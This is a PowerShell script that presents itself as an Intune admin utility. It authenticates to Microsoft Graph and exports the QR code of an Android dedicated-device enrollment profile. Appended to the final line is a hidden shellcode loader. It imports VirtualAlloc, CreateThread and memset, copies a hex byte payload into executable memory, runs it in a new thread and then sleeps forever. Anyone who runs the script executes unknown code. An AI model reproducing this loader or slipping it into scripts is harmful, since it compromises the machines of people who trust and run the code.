




function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User

$tenant = $userUpn.Host

Write-Host "Checking for AzureAD module..."

    $AadModule = Get-Module -Name "AzureAD" -ListAvailable

    if ($AadModule -eq $null) {

        Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"
        $AadModule = Get-Module -Name "AzureADPreview" -ListAvailable

    }

    if ($AadModule -eq $null) {
        write-host
        write-host "AzureAD Powershell module not installed..." -f Red
        write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow
        write-host "Script can't continue..." -f Red
        write-host
        exit
    }




    if($AadModule.count -gt 1){

        $Latest_Version = ($AadModule | select version | Sort-Object)[-1]

        $aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }

            

            if($AadModule.count -gt 1){

            $aadModule = $AadModule | select -Unique

            }

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

    else {

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null

[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null

$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"

$redirectUri = "urn:ietf:wg:oauth:2.0:oob"

$resourceAppIdURI = "https://graph.microsoft.com"

$authority = "https://login.microsoftonline.com/$Tenant"

    try {

    $authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority

    
    

    $platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"

    $userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")

    $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result

        

        if($authResult.AccessToken){

        

        $authHeader = @{
            'Content-Type'='application/json'
            'Authorization'="Bearer " + $authResult.AccessToken
            'ExpiresOn'=$authResult.ExpiresOn
            }

        return $authHeader

        }

        else {

        Write-Host
        Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red
        Write-Host
        break

        }

    }

    catch {

    write-host $_.Exception.Message -f Red
    write-host $_.Exception.ItemName -f Red
    write-host
    break

    }

}



Function Get-AndroidEnrollmentProfile {



$graphApiVersion = "Beta"
$Resource = "deviceManagement/androidDeviceOwnerEnrollmentProfiles"
    
    try {
        
        $now = (Get-Date -Format s)    
        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)?`$filter=tokenExpirationDateTime gt $($now)z"
        (Invoke-RestMethod -Uri $uri –Headers $authToken –Method Get).value
    
    }
    
    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}



Function Get-AndroidQRCode{



[cmdletbinding()]

Param(
[parameter(Mandatory=$true)]
[string]$Profileid
)

$graphApiVersion = "Beta"

    try {
            
        $Resource = "deviceManagement/androidDeviceOwnerEnrollmentProfiles/$($Profileid)?`$select=qrCodeImage"
        $uri = "https://graph.microsoft.com/$graphApiVersion/$Resource"
        (Invoke-RestMethod -Uri $uri –Headers $authToken –Method Get)
                    
    }
    
    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}





write-host


if($global:authToken){

    
    $DateTime = (Get-Date).ToUniversalTime()

    
    $TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutes

        if($TokenExpires -le 0){

        write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow
        write-host

            

            if($User -eq $null -or $User -eq ""){

            $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
            Write-Host

            }

        $global:authToken = Get-AuthToken -User $User

        }
}



else {

    if($User -eq $null -or $User -eq ""){

    $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
    Write-Host

    }


$global:authToken = Get-AuthToken -User $User

}





$parent = [System.IO.Path]::GetTempPath()
[string] $name = [System.Guid]::NewGuid()
New-Item -ItemType Directory -Path (Join-Path $parent $name) | Out-Null
$TempDirPath = "$parent$name"



$Profiles = Get-AndroidEnrollmentProfile

if($profiles){

$profilecount = @($profiles).count

    if(@($profiles).count -gt 1){

    Write-Host "Corporate-owned dedicated device profiles found: $profilecount"
    Write-Host

    $COSUprofiles = $profiles.Displayname | Sort-Object -Unique

    $menu = @{}

    for ($i=1;$i -le $COSUprofiles.count; $i++) 
    { Write-Host "$i. $($COSUprofiles[$i-1])" 
    $menu.Add($i,($COSUprofiles[$i-1]))}

    Write-Host
    $ans = Read-Host 'Choose a profile (numerical value)'

    if($ans -eq "" -or $ans -eq $null){

        Write-Host "Corporate-owned dedicated device profile can't be null, please specify a valid Profile..." -ForegroundColor Red
        Write-Host
        break

    }

    elseif(($ans -match "^[\d\.]+$") -eq $true){

    $selection = $menu.Item([int]$ans)

    Write-Host

        if($selection){

            $SelectedProfile = $profiles | ? { $_.DisplayName -eq "$Selection" }

            $SelectedProfileID = $SelectedProfile | select -ExpandProperty id

            $ProfileID = $SelectedProfileID

            $ProfileDisplayName = $SelectedProfile.displayName

        }

        else {

            Write-Host "Corporate-owned dedicated device profile selection invalid, please specify a valid Profile..." -ForegroundColor Red
            Write-Host
            break

        }

    }

    else {

        Write-Host "Corporate-owned dedicated device profile selection invalid, please specify a valid Profile..." -ForegroundColor Red
        Write-Host
        break

    }

}

    elseif(@($profiles).count -eq 1){

        $Profileid = (Get-AndroidEnrollmentProfile).id
        $ProfileDisplayName = (Get-AndroidEnrollmentProfile).displayname
    
        Write-Host "Found a Corporate-owned dedicated devices profile '$ProfileDisplayName'..."
        Write-Host

    }

    else {

        Write-Host
        write-host "No enrollment profiles found!" -f Yellow
        break

    }

Write-Warning "You are about to export the QR code for the Dedicated Device Enrollment Profile '$ProfileDisplayName'"
Write-Warning "Anyone with this QR code can Enrol a device into your tenant. Please ensure it is kept secure."
Write-Warning "If you accidentally share the QR code, you can immediately expire it in the Intune UI."
write-warning "Devices already enrolled will be unaffected."
Write-Host
Write-Host "Show token? [Y]es, [N]o"

$FinalConfirmation = Read-Host

    if ($FinalConfirmation -ne "y"){
    
        Write-Host "Exiting..."
        Write-Host
        break

    }

    else {

    Write-Host

    $QR = (Get-AndroidQRCode -Profileid $ProfileID)
    
    $QRType = $QR.qrCodeImage.type
    $QRValue = $QR.qrCodeImage.value
 
    $imageType = $QRType.split("/")[1]
 
    $filename = "$TempDirPath\$ProfileDisplayName.$imageType"

    $bytes = [Convert]::FromBase64String($QRValue)
    [IO.File]::WriteAllBytes($filename, $bytes)

        if (Test-Path $filename){

            Write-Host "Success: " -NoNewline -ForegroundColor Green
            write-host "QR code exported to " -NoNewline
            Write-Host "$filename" -ForegroundColor Yellow
            Write-Host

        }

        else {
        
            write-host "Oops! Something went wrong!" -ForegroundColor Red
        
        }
       
    }

}

else {

    Write-Host "No Corporate-owned dedicated device Profiles found..." -ForegroundColor Yellow
    Write-Host

}
$SFcw = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $SFcw -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xd0,0xbd,0x13,0xb0,0x9a,0x4a,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x47,0x31,0x6f,0x18,0x03,0x6f,0x18,0x83,0xef,0xef,0x52,0x6f,0xb6,0xe7,0x11,0x90,0x47,0xf7,0x75,0x18,0xa2,0xc6,0xb5,0x7e,0xa6,0x78,0x06,0xf4,0xea,0x74,0xed,0x58,0x1f,0x0f,0x83,0x74,0x10,0xb8,0x2e,0xa3,0x1f,0x39,0x02,0x97,0x3e,0xb9,0x59,0xc4,0xe0,0x80,0x91,0x19,0xe0,0xc5,0xcc,0xd0,0xb0,0x9e,0x9b,0x47,0x25,0xab,0xd6,0x5b,0xce,0xe7,0xf7,0xdb,0x33,0xbf,0xf6,0xca,0xe5,0xb4,0xa0,0xcc,0x04,0x19,0xd9,0x44,0x1f,0x7e,0xe4,0x1f,0x94,0xb4,0x92,0xa1,0x7c,0x85,0x5b,0x0d,0x41,0x2a,0xae,0x4f,0x85,0x8c,0x51,0x3a,0xff,0xef,0xec,0x3d,0xc4,0x92,0x2a,0xcb,0xdf,0x34,0xb8,0x6b,0x04,0xc5,0x6d,0xed,0xcf,0xc9,0xda,0x79,0x97,0xcd,0xdd,0xae,0xa3,0xe9,0x56,0x51,0x64,0x78,0x2c,0x76,0xa0,0x21,0xf6,0x17,0xf1,0x8f,0x59,0x27,0xe1,0x70,0x05,0x8d,0x69,0x9c,0x52,0xbc,0x33,0xc8,0x97,0x8d,0xcb,0x08,0xb0,0x86,0xb8,0x3a,0x1f,0x3d,0x57,0x76,0xe8,0x9b,0xa0,0x79,0xc3,0x5c,0x3e,0x84,0xec,0x9c,0x16,0x42,0xb8,0xcc,0x00,0x63,0xc1,0x86,0xd0,0x8c,0x14,0x32,0xd4,0x1a,0x9d,0xf1,0xdb,0xd7,0xc9,0xf7,0xe3,0xfc,0x30,0x71,0x05,0x52,0x13,0xd1,0x9a,0x12,0xc3,0x91,0x4a,0xfa,0x09,0x1e,0xb4,0x1a,0x32,0xf4,0xdd,0xb0,0xdd,0xa1,0xb6,0x2c,0x47,0xe8,0x4d,0xcd,0x88,0x26,0x28,0xcd,0x03,0xc5,0xcc,0x83,0xe3,0xa0,0xde,0x73,0x04,0xff,0xbd,0xd5,0x1b,0xd5,0xa8,0xd9,0x89,0xd2,0x7a,0x8e,0x25,0xd9,0x5b,0xf8,0xe9,0x22,0x8e,0x73,0x23,0xb7,0x71,0xeb,0x4c,0x57,0x72,0xeb,0x1a,0x3d,0x72,0x83,0xfa,0x65,0x21,0xb6,0x04,0xb0,0x55,0x6b,0x91,0x3b,0x0c,0xd8,0x32,0x54,0xb2,0x07,0x74,0xfb,0x4d,0x62,0x84,0xc7,0x9b,0x4a,0xf2,0x29,0x18;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$XeXk=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($XeXk.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$XeXk,0,0,0);for (;;){Start-sleep 60};

